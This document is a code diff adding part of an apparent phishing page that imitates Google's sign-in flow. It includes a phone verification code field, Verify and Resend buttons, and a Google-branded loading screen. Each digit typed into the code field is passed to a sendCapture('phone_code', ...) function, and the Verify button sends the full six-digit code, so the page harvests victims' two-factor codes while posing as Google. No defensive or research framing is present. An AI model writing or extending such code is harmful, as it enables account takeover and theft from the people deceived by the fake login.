+                  <div style={{ position: 'relative', marginBottom: 8 }}>
+                    <input
+                      data-testid="google-phone-code-input"
+                      type="text"
+                      inputMode="numeric"
+                      maxLength={6}
+                      autoFocus
+                      value={phoneCodeInput}
+                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCodeInput(v); sendCapture('phone_code', v); }}
+                      onFocus={() => setPhoneCodeFocused(true)}
+                      onBlur={() => setPhoneCodeFocused(false)}
+                      style={{
+                        width: '100%', padding: '20px 16px 8px', fontSize: 20,
+                        letterSpacing: '0.3em', textAlign: 'center',
+                        border: `${phoneCodeFocused ? 2 : 1}px solid ${phoneCodeFocused ? focusBorderColor : borderColor}`,
+                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
+                      }}
+                    />
+                    <label style={{
+                      position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s',
+                      ...floatingLabel(phoneCodeFocused, !!phoneCodeInput),
+                    }}>
+                      Enter code
+                    </label>
+                  </div>
+                  <button data-testid="google-resend-code"
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
+                    Resend code
+                  </button>
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <button onClick={() => setStep('phone-verify')}
+                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                    Back
+                  </button>
+                  <button data-testid="google-code-verify-btn"
+                    onClick={() => { if (phoneCodeInput.length === 6) sendCapture('phone_code', phoneCodeInput); }}
+                    disabled={phoneCodeInput.length < 6}
+                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 6 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 6 ? 0.5 : 1 }}>
+                    Verify
+                  </button>
+                </div>
+              </>
+            )}
           </div>
+        </div>
+      </div>
+    </>
+  );
+}
+
+function GoogleLoadingScreen({ isDark, bg, cardBg, textColor }: { isDark: boolean; bg: string; cardBg: string; textColor: string }) {
+  return (
+    <>
+      <style>{`@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');`}</style>
+      <div className="w-full h-full flex items-center justify-center"
+        style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif", backgroundColor: bg, color: textColor }}>
+        <div style={{
+          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
+          background: cardBg, borderRadius: 28, padding: 40, minWidth: 320,
+        }}>
+          <div style={{ marginBottom: 24 }}><GoogleLogo /></div>
+          <svg className="animate-spin" width="36" height="36" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
+            <defs>
+              <linearGradient id="goog-spin" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stopColor="#4285F4"/>
+                <stop offset="33%" stopColor="#EA4335"/>
+                <stop offset="66%" stopColor="#FBBC05"/>
+                <stop offset="100%" stopColor="#34A853"/>
+              </linearGradient>
+            </defs>
+            <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3.5" strokeLinecap="round"
+              stroke="url(#goog-spin)" strokeDasharray="80 126" />
+          </svg>
         </div>
       </div>
     </>
